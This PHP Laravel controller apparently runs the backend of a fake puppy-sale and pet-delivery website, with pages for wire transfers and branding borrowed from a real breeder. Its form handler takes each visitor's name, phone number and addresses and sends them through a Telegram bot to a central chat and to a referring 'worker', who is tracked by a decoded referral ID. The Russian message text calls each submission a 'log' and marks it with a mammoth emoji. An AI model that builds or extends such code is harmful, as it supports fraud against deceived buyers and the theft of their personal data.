<?php

namespace App\Http\Controllers;

use App\Http\Services\OrderServices;
use App\Models\delivery;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Log;
use App\Http\Services\ProductServices;
use App\Http\Services\CategoryServices;
use Illuminate\Support\Facades\Cookie;

class PageController extends Controller
{
    function unshuffleId($shuffledId)
    {
        $numStr = strval($shuffledId);
        $digits = str_split($numStr);
        $permutationPattern = [[0, 5], [2, 1], [6, 3], [4, 3], [6, 3], [4, 2], [3, 5]];

        for ($i = count($permutationPattern) - 1; $i >= 0; $i--) {
            $firstIndex = $permutationPattern[$i][0];
            $secondIndex = $permutationPattern[$i][1];

            if ($firstIndex < count($digits) && $secondIndex < count($digits)) {
                $temp = $digits[$firstIndex];
                $digits[$firstIndex] = $digits[$secondIndex];
                $digits[$secondIndex] = $temp;
            }
        }

        return intval(implode('', $digits), 10);
    }

    public function petDeliveryForm()
    {
        return view('pages.pet-delivery-form');
    }

    public function petDeliverySearch()
    {
        return view('pages.pet-delivery');
    }

    public function petDeliveryFormCreate(Request $request)
    {
        $data = $request->all();
        unset($data['_token']);
        $data['UUID'] = strtoupper(Str::random(9));
        $delivery = delivery::query()->create($data);
        $worker = $request->cookie('worker');
        if ($worker) {
            $delivery->worker_id = $worker;
            $delivery->save();
        }
        if ($delivery) {
            return redirect()->route('pet-delivery-type:order', ['order' => $delivery->id]);
        }
        return redirect()->back();


    }

    public function index(Request $request)
    {
        $products = (new ProductServices)->get()->where("status", "available")->inRandomOrder()->limit(12)->get();
        $categorys = (new CategoryServices)->get()->inRandomOrder()->limit(5)->get();
        if (isset($request->s)) {
            $worker_id = $this->unshuffleId($request->s);
            \cookie()->queue('worker', $worker_id, 8400600);
        }
        return view('pages.index', compact("products", "categorys"));
    }


    public function petDeliveryType($order)
    {
        $delivery = delivery::query()->find($order);
        if (!$delivery) {
            return redirect()->route('pet-delivery-search');
        }

        return view('pages.pet-delivery-type', compact('order'));

    }

    public function petDeliveryTypePost($order, Request $request)
    {
        $delivery = delivery::query()->find($order);
        if (!$delivery) {
            return redirect()->route('pet-delivery-search');
        }
        $delivery->delivery_type = $request->delivery_type;
        $delivery->save();

        $message = "🦣Пришел новый лог с PET DELIVERY\n";
        $message .= "🆔ID: " . $delivery->id . "\n";
        $message .= "👨‍🦳Имя фамилия: " . $delivery->fname . ' ' . $delivery->lname . "\n";
        $message .= "📞Телефон: " . $delivery->phone . "\n";
        $message .= "🌆Страна: " . $delivery->country . "\n";
        $message .= "🏠Адрес: " . $delivery->address . "\n\n";
        $message .= "👨‍🦳Имя фамилия доставки: " . $delivery->fname_delivery . ' ' . $delivery->lname_delivery . "\n";
        $message .= "📞Телефон доставки: " . $delivery->phone_delivery . "\n";
        $message .= "🏠Адрес доставки: " . $delivery->address_delivery . "\n";
        $message .= "🌆Страна доставки: " . $delivery->country_delivery . "\n\n";

        $message .= "📦Тип доставки: " . $delivery->delivery_type . "\n";
        $message .= "📅Дата доставки: " . $delivery->date . "\n";


        $message .= "🔗Ссылка: " . route('pet-delivery-confirm:order', $delivery->id) . "\n";

        $message = urlencode($message);
        if ($request->cookie('worker')) {
            $url = "https://api.telegram.org/bot" . env('SECRET_KEY') . "/sendMessage?chat_id=" . $request->cookie('worker')  . "&text=" . $message;
            $response = file_get_contents($url);
            $data = DB::connection('mysql2')->query()->from('user')->where('tgId', $request->cookie('worker'))->first();
            if($data != null){
                $message .= urlencode("👨‍🦳ID работника: ") . '<a href="tg://user?id='.$data->tgId.'">'. $data->firstName.'</a>';
            }
        }

        $url = "https://api.telegram.org/bot" . env('SECRET_KEY') . "/sendMessage?chat_id=" . env('CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";
        $response = file_get_contents($url);
        return redirect()->route('pet-delivery-confirm:order', $delivery->id);

    }

    public function petDeliveryConfirm($order)
    {
        $delivery = delivery::query()->find($order);
        if (!$delivery) {
            return redirect()->route('pet-delivery-search');
        }
        if ($delivery->delivery_type == null) {
            return redirect()->route('pet-delivery-type');
        }
        return view('pages.pet-delivery-confirm', compact('delivery'));

    }


    public function accountAddresses()
    {
        return view('pages.lk.addresses');
    }

    public function account()
    {
        return view('pages.lk.index');
    }

    public function login()
    {
        return view('pages.auth.login');
    }

    public function newsOne()
    {
        return view('pages.news.one');
    }

    public function news()
    {
        return view('pages.news.index');
    }

    public function taxi()
    {
        return view('pages.taxi');
    }

    public function privacyPolicy()
    {
        return view('pages.text.privacy-policy');
    }

    public function taxi2(Request $request)
    {
        cookie()->queue('taxi', $request->taxi, 8400600);
        return;
    }


    public function businessLicense()
    {
        return view('pages.text.business-license');
    }

    public function delivery()
    {
        return view('pages.text.delivery');
    }

    public function finance2021()
    {
        return view('pages.text.finance-2021');
    }

    public function healthGuarantee()
    {
        return view('pages.text.health-guarantee');
    }

    public function hoursOfOperation2023()
    {
        return view('pages.text.hours-of-operation-2023');
    }

    public function purchasingProcess1()
    {
        return view('pages.text.purchasing-process-1');
    }

    public function rollyPupsIncRollyTeacupPuppies()
    {
        return view('pages.text.rolly-pups-inc-rolly-teacup-puppies');
    }

    public function rollyPupsOnMedia()
    {
        return view('pages.text.rolly-pups-on-media');
    }

    public function scam()
    {
        return view('pages.text.scam');
    }

    public function shoppingList()
    {
        return view('pages.text.shopping-list');
    }

    public function specialOrder()
    {
        return view('pages.text.special-order');
    }

    public function verifiedContact()
    {
        return view('pages.text.verified-contact-lists-2021');
    }

    public function wireTransfer()
    {
        return view('pages.text.wire-transfer');
    }

    public function aboutRolly()
    {
        return view('pages.text.about-rolly');
    }
}
